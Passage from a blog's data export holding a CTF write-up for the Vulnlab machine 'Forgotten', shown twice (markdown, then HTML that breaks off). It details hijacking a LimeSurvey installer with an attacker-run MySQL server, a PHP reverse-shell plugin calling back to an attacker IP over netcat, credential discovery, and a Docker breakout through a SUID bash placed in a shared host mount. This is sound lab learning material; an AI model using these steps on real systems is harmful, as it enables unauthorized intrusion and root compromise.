/fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:53 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64\n0:49 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64\n0:49 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64\n0:49 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64\n0:54 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64\n0:55 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64\n```\n\nWhile a lot of these don't seem very interesting, you'll notice that there's a mount pointing towards `/opt/limesurvey` on the host machine. We can confirm that this is a folder by checking through our SSH session on the host machine.\n\n```\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ls\nLICENSE      admin        docs         installer  node_modules      psalm-all.xml     setdebug.php  upload\nREADME.md    application  gulpfile.js  locale     open-api-gen.php  psalm-strict.xml  themes        vendor\nSECURITY.md  assets       index.php    modules    plugins           psalm.xml         tmp\n```\n\nIt seems that the mount specifically is pointing towards `/dev/root`. While this is the location of the mount, the mount itself is pulling the contents of `/opt/limesurvey` to the `/dev/root` directory and can be modified through the docker container.\n\nThe location of the mount on our docker container that is connected to `/opt/limesurvey` is denoted as `/var/www/html/survey`, which is the base directory of the LimeSurvey service.\n\nSo the exploitation for this seems to be relatively simple. First since I didn't do it before, we'll login to the docker container as root due to the `limesvc` user's sudo privileges.\n\nIf you run into a `sudo` error that states you need a proper terminal to read the password, I would usually recommend just creating a proper shell with tools like Python or `stty`. The issue is that we're in a docker container and don't have access to either of those tools - thus I'd recommend using a C2 such as [Sliver](https://github.com/BishopFox/sliver) to have it create a proper terminal for you.\n\n```\nlimesvc@efaa6f5097ed:/home/limesvc$ sudo -l\n[sudo] password for limesvc: \nMatching Defaults entries for limesvc on efaa6f5097ed:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser limesvc may run the following commands on efaa6f5097ed:\n    (ALL : ALL) ALL\nlimesvc@efaa6f5097ed:/home/limesvc$\n\nlimesvc@efaa6f5097ed:/home/limesvc$ sudo su\nroot@efaa6f5097ed:/home/limesvc# whoami\nroot\nroot@efaa6f5097ed:/home/limesvc#\n```\n\n# Exploiting Mounted Root-SUID Binary\n\nSo just a brief snippet of how sudo privileges work, our `root` user has an ID value of 0, in which every default root user will have this privilege ID value set. Our `limesvc` on our SSH user does not have this ID set to them, and is not allowed to run any values within the context of root.\n\nHowever, we do have the privileges of root within our docker container and a way to transfer this file to our host machine. Thus, if we are able to change the contents of a shell binary in our docker container, have it adopt the privileges of root, and adjust the SUID bit of the binary - we should be able to escalate our privileges.\n\nSo first we'll copy the `/bin/bash` binary in our docker container to the mounted directory `/var/www/html/survey`. I'll also rename the binary to `./daz`.\n\n`root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./daz`\n\nWe'll then adjust the SUID bit of the binary using `chmod`. As context as to what this does - we're essentially saying to allow all users to be able to run this binary in the context of the root user. That means ANY user will be able to run this as root.\n\n`root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./daz`\n\nNow, we should be able to go back to our SSH session and verify that the file is there.\n\n```\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz\n-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz\n```\n\nYou'll see now that this file is owned by root, but we'll still be able to run it as our current user. If we run it with the `-p` option (which stands for privileged mode), it should generate a session for us as root.\n\n```\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz\n-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ./daz -p\ndaz-5.1# whoami\nroot\ndaz-5.1#\n```\n\nAnd that's it! The root flag is within `/root/root.txt`, and thus we have completed this machine.\n\n# Conclusion\n\nBig thanks to xct for creating this machine, it was very fun and helped strengthen some post-exploitation methodologies that I had experienced briefly in the past. The LimeSurvey installation was also really interesting and helped with some brainstorming into the attack path.\n\n# Resources\n\nhttps://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\nhttps://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B\nhttps://github.com/Y1LD1R1M-1337/Limesurvey-RCE\nhttps://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\nhttps://github.com/cdk-team/CDK\nhttps://github.com/BishopFox/sliver","slug":"forgotten","published":1,"updated":"2024-06-05T20:04:38.949Z","_id":"clx24ijt60000iauf3kfs9jws","comments":1,"layout":"post","photos":[],"content":"<p>This machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan to see what ports are open.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 21:55 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.113.195</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT   STATE SERVICE VERSION</span><br><span class=\"line\">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   256 25:94:a4:a0:85:b6:06:ae:b3:7b:5e:45:c1:b6:32:b5 (ECDSA)</span><br><span class=\"line\">|_  256 22:d1:a0:9e:e2:58:92:d3:7b:9d:86:0f:04:28:8c:65 (ED25519)</span><br><span class=\"line\">80/tcp open  http    Apache httpd 2.4.56</span><br><span class=\"line\">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class=\"line\">|_http-title: 403 Forbidden</span><br><span class=\"line\">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class=\"line\">Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)</span><br><span class=\"line\">No exact OS matches for host (test conditions non-ideal).</span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 22/tcp)</span><br><span class=\"line\">HOP RTT       ADDRESS</span><br><span class=\"line\">1   99.64 ms  10.8.0.1</span><br><span class=\"line\">2   102.00 ms 10.10.113.195</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 42.32 seconds</span><br></pre></td></tr></table></figure>\n\n<p>I see a lot of these on HTB, so I’m relatively used to seeing just port 22 (SSH) and port 80 (HTTP) open. Nonetheless let’s see specifically what’s running on the web server.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/b.jpg\"></p>\n<p>This is interesting, as immediately the moment we try to access the base link for the website, it says we do not have access to the resource. At this point, I’m assuming that we are guaranteed to find subdirectories from a <code>gobuster</code> scan, since we have no other resources to access at this point.<br><code>gobuster dir -u http://10.10.113.195/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>\n<p>Upon a brief few seconds of scanning, we are greeted with a 301 redirect to <code>/survey</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/survey               (Status: 301) [Size: 315] [--&gt; http://10.10.113.195/survey/]</span><br><span class=\"line\">/server-status        (Status: 403) [Size: 278]</span><br><span class=\"line\">Progress: 220560 / 220561 (100.00%)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Finished</span><br><span class=\"line\">===============================================================</span><br></pre></td></tr></table></figure>\n\n<p>Upon accessing the redirect, we are brought to an installation page for <code>LimeSurvey</code>.</p>\n<h1 id=\"Exploiting-Limesurvey-Installation\"><a href=\"#Exploiting-Limesurvey-Installation\" class=\"headerlink\" title=\"Exploiting Limesurvey Installation\"></a>Exploiting Limesurvey Installation</h1><p>Based off some research, it seems as though LimeSurvey is an open-source survey application that is used to develop online surveys and quizzes for its audience. It’s primarily built up in PHP and utilizes SQL database applications such as MySQL, PostgreSQL, or even the Windows alternative of MSSQL.</p>\n<p>This specific product seems to be marketed towards researchers, universities, web developers and students alike.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/b_1.jpg\"></p>\n<p>I researched into a few CVEs for LimeSurvey 6.3.7, however there wasn’t much that I could find regarding our specific instance of it. Most of the CVEs related to versions 5.0, 3.0, and a few versions in between.</p>\n<p>Nonetheless, we can progress with the installation, so we’ll continue to do that until something particularly interesting comes up.</p>\n<p>I’ve listed my thoughts on each section of the installation page below in the form of a list and what I think we could potentially accomplish.</p>\n<ol>\n<li>Welcome -&gt; Contains Language selection and <code>installation start</code> option.</li>\n<li>License -&gt; Regulatory information, nothing out of the ordinary.</li>\n<li>Pre-installation Check -&gt; Contains vital information regarding the services used for this LimeSurvey instance.</li>\n</ol>\n<p>I’d like to point out something interesting - it seems as though a MySQL database option is present within the pre-installation check. That being said, we could not see one on the frontend of the server (based off our NMAP scan), nor is the option checked off within this screen.</p>\n<p>The other information on this page does not seem to be as important, as the PHP version does not seem to be exploitable to my awareness.</p>\n<ol start=\"4\">\n<li>Configuration -&gt; Main attack path concern, allows us to configure various parts of the application - namely the database.</li>\n</ol>\n<p>As explained previously, this section of the installation page seemed odd at first glance as it allows us to configure the MySQL database association with our LimeSurvey instance.</p>\n<ol start=\"5\">\n<li>Database settings -&gt; Unconfigurable until database configuration is completed.</li>\n<li>Administrator settings -&gt; Unconfigurable until database configuration is completed.</li>\n</ol>\n<p>As I explained previously, the database configuration portion of the installation seems the most interesting. The particular section within this page that I’m referring to is the <code>Database location</code> section, which is seemingly allowing us to allocate an IP address of a database to the LimeSurvey instance.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/c.jpg\"></p>\n<p>While this is preset to <code>localhost</code>, I don’t see any reason as to why we couldn’t alter this to potentially point somewhere else - such as to our own machine.</p>\n<h1 id=\"Local-MySQL-Configuration\"><a href=\"#Local-MySQL-Configuration\" class=\"headerlink\" title=\"Local MySQL Configuration\"></a>Local MySQL Configuration</h1><p>So with that in mind, let’s try to set up our own MySQL database server within our attack machine. <a href=\"https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\">https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">daz@daz$ sudo apt install mariadb-server</span><br><span class=\"line\"></span><br><span class=\"line\">daz@daz$ sudo systemctl start mysql</span><br><span class=\"line\"></span><br><span class=\"line\">daz@daz$ sudo service mysql status</span><br><span class=\"line\">● mariadb.service - MariaDB 10.11.6 database server</span><br><span class=\"line\">     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; preset: disabled)</span><br><span class=\"line\">     Active: active (running) since Tue 2024-05-14 22:52:07 EDT; 1min 36s ago</span><br><span class=\"line\">     [...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">daz@daz$ sudo mysql</span><br></pre></td></tr></table></figure>\n\n<p>So we’ll need to specify a user to authenticate as for our particular case, which I used this <a href=\"https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B\">article</a> on StrongDM to help with.</p>\n<p>I’ll outline the steps we need to take in order to create a database and set up the necessary privileges to a user for our LimeSurvey installation.</p>\n<p>First we’ll need to create a database to use, since LimeSurvey requires a <code>Database name</code> to be supplied with the installation.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; CREATE DATABASE limesurvey;</span><br><span class=\"line\">Query OK, 1 row affected (0.001 sec)</span><br></pre></td></tr></table></figure>\n\n<p>Next, we’ll create a user under the alias <code>lime_user</code> who will have all of the necessary privileges to our setup.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; CREATE USER &#x27;lime_user&#x27;@&#x27;%&#x27; IDENTIFIED by &#x27;lime_user&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">Query OK, 0 rows affected (0.006 sec)</span><br></pre></td></tr></table></figure>\n\n<p>Note that the <code>%</code> in our user creation query essentially acts as a wildcard for all interfaces.</p>\n<p>The next concern we need to focus on is the specific privileges that our user has in relation to what we need for the setup. To any beginners, a MySQL privilege is essentially any ruleset or specified rule that a MySQL user has that regulates their actions on a database. This essentially restricts the user into performing various actions on the database based on the privileges they are given. This can be broken up into 4 different types of privileges:</p>\n<p><strong>Global Privileges</strong>: These privileges apply to every database on the hosted server. By default, administrative privileges will fall into this category as they enable a user to perform operations that are relative to a specific database.<br><strong>Database Privileges</strong>: As expected in the name, these privileges apply solely to specified databases and all objects within those databases (i.e. columns, tables, entries, etc.).<br><strong>Proxy Privileges</strong>: These allow a user to act in the context of other users and adopt their same privileges within the space of the situation they are involved in.<br><strong>Object Privileges</strong>: These privileges apply solely to the types of objects stored in a database and can be granted between a set of objects if needed.</p>\n<p>In a red-teaming environment such as an enterprise infrastructure, we’d want to create a user that looks relatively normal and in-line with regular options as not to arise suspicious. We can do this by delegating specific privileges to them such as <code>INSERT</code> or <code>ALTER</code> dependent on what is needed for the setup.</p>\n<p>However this won’t be the case for our situation, so we can grant them <code>ALL PRIVILEGES</code> so they can perform any actions needed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; GRANT ALL ON *.* TO &#x27;lime_user&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br><span class=\"line\">Query OK, 0 rows affected (0.006 sec)</span><br></pre></td></tr></table></figure>\n\n<p>Note that we’re essentially saying that our username&#x2F;password is <code>lime_user:lime_user</code> with the above query.*</p>\n<p>We can confirm that our privileges have been granted to the specific user with the below query.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; SHOW GRANTS for &#x27;lime_user&#x27;@&#x27;%&#x27;;</span><br><span class=\"line\">+-------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class=\"line\">| Grants for lime_user@%                                                                                                              |</span><br><span class=\"line\">+-------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class=\"line\">| GRANT ALL PRIVILEGES ON *.* TO `lime_user`@`%` IDENTIFIED BY PASSWORD &#x27;*0F1EF1AB79F549AD4FE495927D8C200E7413BD85&#x27; WITH GRANT OPTION |</span><br><span class=\"line\">+-------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class=\"line\">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>\n\n\n<p>Another thing we’ll also need to do is configure the bind address for our MySQL server. By default, it’s meant to listen solely on localhost as it acts as a backend server.</p>\n<p>We can do this by editing <code>/etc/mysql/mariadb.conf.d/50-server.cnf</code> and changing the <code>bind-address</code> to <code>0.0.0.0</code> to listen on all interfaces.</p>\n<p>This should allow the remote configuration to access our MySQL server and populate any fields needed. We can then restart our MySQL server with <code>sudo systemctl restart mysql</code></p>\n<p>We’ll also need flush all of our privileges to ensure that they are configured correctly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br><span class=\"line\">Query OK, 0 rows affected (0.001 sec)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Redirecting-Database-Configuration-to-Local-MySQL\"><a href=\"#Redirecting-Database-Configuration-to-Local-MySQL\" class=\"headerlink\" title=\"Redirecting Database Configuration to Local MySQL\"></a>Redirecting Database Configuration to Local MySQL</h1><p>With that, our backend database configuration should be finished and ready for the LimeSurvey setup. We’ll fill in the necessary parameters into the configuration page and hope for any progress.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/d.jpg\"></p>\n<p>If we have followed all the previous steps and select the <code>Next</code> button, we can see that we’re greeted with a message that is asking us to populate the <code>limesurvey</code> database. It also tells us that the database already exists, since we’ve already created it the previous setup steps. We’ll select <code>Populate database</code>.</p>\n<p>Afterwards, we’re brought to an administration configuration, to which we can configure our admin credentials to just be <code>daz:daz</code> and just populate the rest with fake information.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/e.jpg\"></p>\n<p>It then notifies us that our password has been confirmed and that it will allow us to authenticate to the administration panel. We’ll select <code>Administration</code> to access this panel.*</p>\n<p>We’re brought to a login page, to which we can use the same credentials that we provided within the configuration portion of the setup.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/f.jpg\"></p>\n<h1 id=\"Limesurvey-RCE\"><a href=\"#Limesurvey-RCE\" class=\"headerlink\" title=\"Limesurvey RCE\"></a>Limesurvey RCE</h1><p>We’re greeted with the LimeSurvey administration panel, which seems to have a lot of stuff from us to mess with. Upon first glance, I was immediately drawn into the <code>Plugin</code> and <code>Theme</code> functionalities within the <code>Configuration</code> tab, so we’ll see if we can potentially upload anything for RCE.</p>\n<p>Generally with web-applications like these, if we’re allowed to upload a plugin, we can upload a malicious reverse shell and have it callback to our machine.</p>\n<p>The resource we’ll use to generate our reverse shell can be found <a href=\"https://github.com/Y1LD1R1M-1337/Limesurvey-RCE\">here</a>.</p>\n<p>The steps can be outlined below for how I used it, though you can also reference the README file within the repository on how to use it.</p>\n<p>Firstly, let’s clone the repository with <code>git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git</code>. This will clone the repository to our machine, to which we can use the files within it.</p>\n<p>According to the README, all that is required of us is to compress the <code>php-rev.php</code> and <code>config.xml</code> to a zip file and upload it as a plugin. There are a few prerequisites that we’ll need to take into account in terms of file changes before sending the plugin into the server.</p>\n<p>First, let’s change the <code>php-rev.php</code> IP address and port to point to a netcat reverse shell that we’ll stand up on our attack machine in a few moments.</p>\n<p><code>$ip = &#39;10.8.0.173&#39;;</code><br><code>$port = 9001;</code></p>\n<p>Next, we’ll need to change the <code>config.xml</code> to make it usable on our current LimeSurvey version. If we do not change this, LimeSurvey will tell us that our plugin is incompatible when we attempt to upload it. This is within the <code>&lt;compatibility&gt;</code> subcategory within the xml file.</p>\n<p><code>&lt;version&gt;6.3.7&lt;/version&gt;</code></p>\n<p>Afterwards, let’s start a netcat reverse shell to listen on our attack machine so we can receive a callback when the reverse shell is executed.</p>\n<p><code>nc -lvnp 9001</code></p>\n<p>Finally, let’s compress the two files to a zip archive and prepare to send it in to LimeSurvey.</p>\n<p><code>zip Y1LD1R1M.zip config.xml php-rev.php</code></p>\n<p>We can now upload our archive to the LimeSurvey <code>Plugins</code> panel, as denoted below.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/g.jpg\"></p>\n<p>If we have performed all the steps prior correctly, LimeSurvey will allow us to install the plugin after this page.</p>\n<p>The plugin can now be accessed at <code>http://10.10.113.195/survey/upload/plugins/Y1LD1R1M/php-rev.php</code>.</p>\n<p>Accessing this will execute our reverse shell and generate a session for us through netcat as the <code>limesvc</code> user.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/h.jpg\"></p>\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>Now that we are on the system and have successfully exploited the web-application, though you’ll find that there is no user flag.</p>\n<p>This was relatively confusing, as I looked within the Wiki and found that there was indeed a user flag that was present on the machine.</p>\n<p>To make our enumeration a little easier, I uploaded the <code>Linpeas</code> script which you can find <a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">here</a>. <code>Linpeas</code> will essentially enumerate the entire filesystem and return and pertinent information it finds for us.</p>\n<p>After running the <code>Linpeas</code> script on the remote machine, you’ll find in it’s output that there is an environment variable set that lists the password of the user through SSH.</p>\n<p><code>LIMESURVEY_PASS=[...snip...]</code></p>\n<p>Also, you’ll notice that there are a large amount of docker settings and configurations present on the machine, making me assume that we’re currently in a docker container.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/docker/overlay2/l/P5AO7VJP3KS26RV7L4G4A3CQMO:/var/lib/docker/overlay2/l/DUMS4MOPBZYYCT5MLU3KOIHV67:/var/lib/docker/overlay2/l/E6PFD55HUOLSDVI5HFVSG2MKY6:/var/lib/docker/overlay2/l/F2C2GU57ABILW44DR6N7IOAS2U:/var/lib/docker/overlay2/l/MTDNHTDTAHLYFOE23OONITLATE:/var/lib/docker/overlay2/l/HVR5FUOEP75JC4WLOLQCLICZW5:/var/lib/docker/overlay2/l/45JVDGBN2HJGR4ZFC56CA3QEFE:/var/lib/docker/overlay2/l/BLHTPLHTIDJITGF5LG7NDGIHIQ:/var/lib/docker/overlay2/l/ON6NXIXZRZZCFUPSYDLFPND5XG:/var/lib/docker/overlay2/l/URCYD6PEIO427ROGBDDSPOX7X4:/var/lib/docker/overlay2/l/TKNY7I37KDSR7UM34B7EAJWLEX:/var/lib/docker/overlay2/l/NI6IE4U3RKI3MI3XAZ7VSTRT5U:/var/lib/docker/overlay2/l/R2CP4KV5O4GJ4TW3FS73ARJZUR:/var/lib/docker/overlay2/l/JENNFERKWWS2TYSPK7WT7IGYT4:/var/lib/docker/overlay2/l/MMP56DFNWIP27YOKHUYTI3CVJ4:/var/lib/docker/overlay2/l/UBBT3YOEP4MEDPPJR5X4D474QX:/var/lib/docker/overlay2/l/ZHODKFSJJ4IAMIIQW7GBHG5QA3:/var/lib/docker/overlay2/l/WHNHWNHOFTA3DGNRVL3B3MMNY6:/var/lib/docker/overlay2/l/TQ6Z55HNEUJUXYWNUWJ4E5BLR3:/var/lib/docker/overlay2/l/UVBX7ES72OROVYQQPYGPTEIA4D:/var/lib/docker/overlay2/l/HCBBV74XSEA5GRAMKLUM7VELUP:/var/lib/docker/overlay2/l/VNQTVVELYXHIW5JNA2W7VHHGHA,upperdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/diff,workdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/work,nouserxattr)</span><br><span class=\"line\">/etc/apache2/conf-available/docker-php.conf-&lt;FilesMatch \\.php$&gt;</span><br><span class=\"line\">/etc/apache2/conf-available/docker-php.conf:\tSetHandler application/x-httpd-php</span><br><span class=\"line\">/etc/apache2/conf-enabled/docker-php.conf-&lt;FilesMatch \\.php$&gt;</span><br><span class=\"line\">/etc/apache2/conf-enabled/docker-php.conf:\tSetHandler application/x-httpd-php</span><br><span class=\"line\">2023-12-02+15:30:12.4134549900 /.dockerenv</span><br><span class=\"line\">/.dockerenv</span><br></pre></td></tr></table></figure>\n\n<p>Since we technically have credentials to the machine, we could try using SSH and logging into the machine. To my surprise, this worked and we can find a usable user.txt flag within the home directory of the <code>limesvc</code> user.</p>\n<p><img src=\"/images/vulnlab/forgotten-vl/i.jpg\"></p>\n<p>Now that we have the user flag, we can continue to enumerate for privilege escalation.</p>\n<h1 id=\"Docker-Breakout-Privilege-Escalation\"><a href=\"#Docker-Breakout-Privilege-Escalation\" class=\"headerlink\" title=\"Docker Breakout Privilege Escalation\"></a>Docker Breakout Privilege Escalation</h1><p>We can run <code>sudo -l</code> with the user’s password to determine any privileges that we have as this user. Unfortunately, this does not return any valid results as <code>user limesvc may not run sudo</code>.</p>\n<p>We’ll need to find another way for privilege escalation aside from privileges. Since we had to breakout of a docker container earlier, we can try and see if there’s an additional privilege escalation vector we can potentially do on the machine in order to gain <code>root</code>.</p>\n<p>One of the common vectors of attack through docker breakouts is utilizing mounts. Mounts essentially allow you to exchange or download files to and from the respective client machine (whether that be the docker container or the actual host itself). I had to exploit this through an NFS share on my Hybrid writeup. It involved us having to view the NFS read&#x2F;write permissions on the share that was mounted, write a file to it, and then copy the permissions to the binary before running it as another user. While this was relatively easy to view the permissions via the NFS share, this is a different story with docker containers.</p>\n<p>A great solution to visualize the permissions for mounts on a docker container is by utilizing <a href=\"https://github.com/cdk-team/CDK\">CDK</a>, a toolset that was made to enumerate container capabilities. This will be helpful to run on the docker container, as it’ll help us determine if there are any to exploit.</p>\n<p>Note that I uploaded the <code>CDK</code> binary through sliver, if you want to do it manually you can use <code>curl</code> with parameters <code>http://(IP):(PORT)/cdk_linux_amd64 -O cdk</code> and also stand up a simple Python HTTP server on your host (just as an example).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ./cdk_linux_amd64 evaluate --full &gt; cdk.txt</span><br><span class=\"line\"></span><br><span class=\"line\">sliver&gt; download cdk.txt</span><br></pre></td></tr></table></figure>\n\n<p>This file has been downloaded on our host, and you’ll see an output of capabilities printed to your screen when you try to read it. Let’s focus on the <code>Mounts</code> section.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[  Information Gathering - Mounts  ]</span><br><span class=\"line\">0:45 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/doc</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname /etc/hostname rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts /etc/hosts rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">259:1 /opt/limesurvey /var/www/html/survey rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro</span><br><span class=\"line\">0:48 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:48 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw</span><br><span class=\"line\">0:53 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64</span><br><span class=\"line\">0:49 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64</span><br><span class=\"line\">0:49 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64</span><br><span class=\"line\">0:49 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64</span><br><span class=\"line\">0:54 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64</span><br><span class=\"line\">0:55 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64</span><br></pre></td></tr></table></figure>\n\n<p>While a lot of these don’t seem very interesting, you’ll notice that there’s a mount pointing towards <code>/opt/limesurvey</code> on the host machine. We can confirm that this is a folder by checking through our SSH session on the host machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">limesvc@ip-10-10-200-233:/opt/limesurvey$ ls</span><br><span class=\"line\">LICENSE      admin        docs         installer  node_modules      psalm-all.xml     setdebug.php  upload</span><br><span class=\"line\">README.md    application  gulpfile.js  locale     open-api-gen.php  psalm-strict.xml  themes        vendor</span><br><span class=\"line\">SECURITY.md  assets       index.php    modules    plugins           psalm.xml         tmp</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the mount specifically is pointing towards <code>/dev/root</code>. While this is the location of the mount, the mount itself is pulling the contents of <code>/opt/limesurvey</code> to the <code>/dev/root</code> directory and can be modified through the docker container.</p>\n<p>The location of the mount on our docker container that is connected to 